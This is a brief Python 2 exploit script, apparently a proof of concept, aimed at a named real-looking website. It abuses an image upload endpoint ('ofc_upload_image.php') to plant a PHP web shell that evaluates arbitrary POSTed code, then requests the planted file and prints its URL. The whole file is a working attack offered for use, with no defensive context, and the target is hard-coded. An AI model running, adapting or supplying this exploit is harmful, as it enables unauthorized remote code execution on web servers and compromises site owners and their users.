#!/usr/bin/env python

# -*- coding: utf-8 -*-

#__author__ = '1c3z'



import urllib2

import random



fileName = "index" + str(random.randrange(1,9)) + ".php"

target = "http://www.fangchan4s.com/dayrui/libraries/Chart/ofc_upload_image.php"

def uploadShell():

    url = target + "?name=" + fileName

    req = urllib2.Request(url, headers={"Content-Type": "application/oct"})

    res = urllib2.urlopen(req, data="<?php eval($_POST['req']) ?>")

    return res.read()



def poc():

    res = uploadShell()

    if res.find("tmp-upload-images") == -1:

        print "Failed !"

        return



    print "upload Shell success"

    url = "http://www.fangchan4s.com/dayrui/libraries/tmp-upload-images/" + fileName

    md5 = urllib2.urlopen(url).read()

    if md5.find("e369853df766fa44e1ed0ff613f563bd") != -1:

        print "poc: " + url



poc()